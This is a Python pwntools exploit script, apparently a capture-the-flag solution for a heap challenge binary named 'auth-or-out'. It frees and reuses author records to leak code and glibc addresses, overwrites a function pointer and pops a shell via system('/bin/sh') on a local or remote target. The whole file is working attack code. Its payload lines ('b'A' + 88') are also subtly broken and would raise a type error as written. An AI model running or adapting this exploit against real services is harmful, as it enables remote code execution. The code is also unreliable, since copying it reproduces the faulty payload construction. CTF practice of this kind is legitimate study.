#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF('auth-or-out')
#glibc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
glibc = ELF('libc6_2.27-3ubuntu1.4_amd64.so', checksec=False)


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1].split(':')
    return remote(host, int(port))


def add_author(p, name: bytes, surname: bytes, age: int, note_size: int = 0, note: bytes = b''):
    p.sendlineafter(b'Choice: ', b'1')
    p.sendlineafter(b'Name: ', name)
    p.sendlineafter(b'Surname: ', surname)
    p.sendlineafter(b'Age: ', str(age).encode())
    p.sendlineafter(b'Author Note size: ', str(note_size).encode())

    if note_size:
        p.sendlineafter(b'Note: ', note)


def print_author(p, author_id: int) -> bytes:
    p.sendlineafter(b'Choice: ', b'3')
    p.sendlineafter(b'Author ID: ', str(author_id).encode())
    p.recvuntil(b'----------------------\n')
    return p.recvuntil(b'----------------------').strip(b'-')


def delete_author(p, author_id: int):
    p.sendlineafter(b'Choice: ', b'4')
    p.sendlineafter(b'Author ID: ', str(author_id).encode())


def leak_from_note(author_data: bytes) -> int:
    note = author_data.splitlines()[4]
    return u64(note.split(b'X' * 0x30)[1].strip(b']').ljust(8, b'\0'))


def main():
    p = get_process()

    add_author(p, b'AAAA', b'BBBB', 1)
    add_author(p, b'CCCC', b'DDDD', 2)
    delete_author(p, 1)
    delete_author(p, 2)
    add_author(p, b'XX', b'YY', 3, 0x37, b'Z' * 0x30)

    note = print_author(p, 1).splitlines()[4]
    print_note_addr = u64(note.split(b'Z' * 0x30)[1].strip(b']').ljust(8, b'\0'))
    elf.address = print_note_addr - elf.sym.PrintNote

    log.info(f'Leaked PrintNote() address: {hex(print_note_addr)}')
    log.info(f'ELF base address: {hex(elf.address)}')

    leaked_function = 'printf'

    payload  = b'A' + 88
    payload += p64(elf.got[leaked_function])
    payload += b'A' + 8
    payload += p64(elf.plt.puts)

    add_author(p, b'EEEE', b'FFFF', 4)
    delete_author(p, 1)
    add_author(p, b'GGGG', b'HHHH', 5, -1, payload)

    p.sendlineafter(b'Choice: ', b'3')
    p.sendlineafter(b'Author ID: ', b'2')

    p.recvuntil(b'Age: ')
    p.recvline()

    leaked_function_addr = u64(p.recvline().strip().ljust(8, b'\0'))
    glibc.address = leaked_function_addr - glibc.sym[leaked_function]

    log.info(f'Leaked {leaked_function}() address: {hex(leaked_function_addr)}')
    log.info(f'Glibc base address: {hex(glibc.address)}')

    payload  = b'A' + 88
    payload += p64(next(glibc.search(b'/bin/sh')))
    payload += b'A' + 8
    payload += p64(glibc.sym.system)

    delete_author(p, 1)
    add_author(p, b'IIII', b'JJJJ', 6, -1, payload)

    p.sendlineafter(b'Choice: ', b'3')
    p.sendlineafter(b'Author ID: ', b'2')

    p.recv()
    p.interactive()


if __name__ == '__main__':
    main()
